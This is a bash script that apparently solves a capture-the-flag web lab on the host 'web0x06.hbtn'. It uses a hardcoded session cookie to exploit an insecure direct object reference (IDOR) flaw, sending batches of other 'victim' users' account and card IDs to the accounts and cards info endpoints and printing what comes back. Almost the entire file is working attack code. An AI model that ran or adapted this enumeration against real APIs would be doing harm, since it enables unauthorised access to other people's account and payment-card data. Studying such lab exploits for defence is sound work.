#!/bin/bash

BASE="http://web0x06.hbtn"
SESSION="TwsxhFuA3MROYn0tQ8WUux-FVvM4UWtEcCfqDuA8GPY.AqT-CQMU8CLKrI_RMM2MiZnxyiw"

HEADERS=(
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0'
  -H 'Accept: */*'
  -H 'Accept-Language: en-US,en;q=0.9'
  -H 'Accept-Encoding: gzip, deflate'
  -H 'Referer: http://web0x06.hbtn/dashboard'
  -H 'Origin: http://web0x06.hbtn'
  -H 'Connection: keep-alive'
  -H "Cookie: session=$SESSION"
  -H 'Priority: u=4'
  -H 'content-type: application/json'
)

echo "=== FLAG 1: IDOR on /api/accounts/info with ALL victim account IDs ==="
echo ""

# All account IDs from all victims (from phase 3 output)
ALL_ACCOUNTS='["72e1e2253bb545a3b78de3748ad6d2d5","067d019332be45ce82b8171f68c6d998","6fc057c382be4062af98e2d3b1ad8e3b","d2f49f1d437544f79c3cce37ebefb5aa","a33e2e54a319460c9a9c9d45237849f7","c44d8117a405416ab21ab5d20b0b79a2","3e428339629641d5a89cba864a7f9ed5","1ed994f0d5a64d718f2b909a2eda3fc6","15cd336da12548ac9612134d135bdd2d","6f8fa396c435477d99e2e43147ce5620","1e8a283cc6864a159a650471b23910b4","b2a87b307c9e4b2999f9702c599168cc","270ad1d3f0d143d39d060325fbb2df88","6cc8e5bd32764d4fa68252bdbf85279c","b2150b3ba1a44e849e11382e1260b95d","ecf865c3fad44cae8c4530b2011316d7","a19bf6a5c376446db917d51f22f74d31","6af24350d8894dfe8eb030e086715d1c","9eeaa2061e6a4b92b6f48276fceafe5b","d8f564639eca4b9e928770ed3ff48295"]'

curl -s "$BASE/api/accounts/info" \
  -X POST "${HEADERS[@]}" \
  --data-raw "{\"accounts_id\":$ALL_ACCOUNTS}" | python3 -m json.tool

echo ""
echo "=== FLAG 1 (alt): IDOR on /api/cards/info with ALL victim card IDs ==="
echo ""

# All card IDs extracted from phase 3 account responses
ALL_CARDS='["f37797dd735e44e7bed30f0f46057259","54ed08bcb6a449588e75ab361804c243","201745ea70984013877302e005a46ccf","418d0dcd657b43c6a1c69225937defe4","e08116587afc4557850d632c29f0428c","b289ddc6b3054de4ac741eeccc80d6c9","3dbe5987c5ad4dc4b390efb06435cc78","087072a5e61e4a68a6ce9e9457e41bb0","6a54578da76b4fc1b2c1f33952494438","b09ad35aa17a41b5925ba0a95cf1b115","9a56a0c513c248098ec4c9e9cf7f6721","65283ba2fc2445e7830559b34500c44c","0634973035da4aa29202be18811f8aaa","b69002ee29944f70950c21ebca9efc07","f510e839c2124648b9939ccb2caeff7b","c9d1301b754a42d9a24e153a866433c3","961d4313f51f454c891c4d7157c518ef","72e58a48780f463795ebb4ff2871e82f","107769531cd74423bd28f9059475496b","4ce1f73b84a4447ca505d7e1d4e7cab9","9d96dd8b85ae4a85b3689e28b72dc3f5","86a052be2ae84a268f72e36f7f7590fb","0c16742c80144866945462d96648876a","85860fc67bb848da9b76b5c860c1d571","35233643d8d445e19f7be3243550c673","7431a159c7494118a8191636867b4cbb","06510cf293544165b8d3284a1a8899c5","1c7d5e13c74b4518b8e108c49e313e7b","7f7f3febada94f3c972108ca337e5285","a31056593dec4d099a92f0359cacd364"]'

curl -s "$BASE/api/cards/info" \
  -X POST "${HEADERS[@]}" \
  --data-raw "{\"cards_id\":$ALL_CARDS}" | python3 -m json.tool

echo ""
echo "=== BONUS: My own cards info ==="
curl -s "$BASE/api/cards/info" \
  -X POST "${HEADERS[@]}" \
  --data-raw '{"cards_id":["a82a1072194149d7867bb547eaca2450","c5f1acfe3122487691689de52fbc4a63","4068c371cdf44aee9d8577bfbd008c45"]}' | python3 -m json.tool
